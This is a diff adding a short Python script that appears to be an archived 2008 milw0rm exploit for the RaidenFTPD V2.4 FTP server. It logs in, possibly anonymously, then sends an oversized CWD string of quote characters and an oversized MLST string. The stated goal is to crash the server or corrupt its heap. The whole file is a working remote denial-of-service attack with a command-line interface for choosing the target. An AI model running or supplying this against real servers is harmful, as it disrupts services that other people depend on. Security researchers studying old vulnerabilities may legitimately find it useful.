@@ -1,0 +1,56 @@
+# RaidenFTPD V2.4 build 3620 exploit
+# probaly heap overflow
+#
+# (x)dmnt 2008
+# -*- coding: windows-1252 -*-
+
+import socket
+import sys, time
+
+evil_cwd = "/"+"\x22"*255
+evil_dir = "X"*505
+
+def help_info():
+    print ("Usage: ShaoKahn <host> <login> <password>\n")
+    print ("Note: anonymous is enought")
+
+def dos_it(hostname, username, passwd):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect((hostname, 21))
+    except:
+        print ("[-] Connection error!")
+        sys.exit(1)
+    r=sock.recv(2048)
+    print "[+] Connected"
+    sock.send("user %s\r\n" %username)
+    r=sock.recv(1024)
+    time.sleep(3)
+    sock.send("pass %s\r\n" %passwd)
+    r=sock.recv(1024)
+    print "[+] Send evil string"
+    time.sleep(3)
+    sock.send("cwd %s\r\n" %evil_cwd)
+    r=sock.recv(1024)
+    time.sleep(3)
+    sock.send("mlst %s\r\n" %evil_dir)
+    r=sock.recv(1024)
+    time.sleep(3)
+    sock.close()
+    print "[:)] Now server d0s'ed/heap corrupted"
+
+print ("\n]RaidenFTPD V2.4 build 3620 remote DoS exploit")
+print ("](x)dmnt 2008\n\n")
+
+if len(sys.argv) <> 4:
+    help_info()
+    sys.exit(1)
+
+else:
+    hostname=sys.argv[1]
+    username=sys.argv[2]
+    passwd=sys.argv[3]
+    dos_it(hostname,username,passwd)
+    sys.exit(0)
+
+# milw0rm.com [2008-10-13]
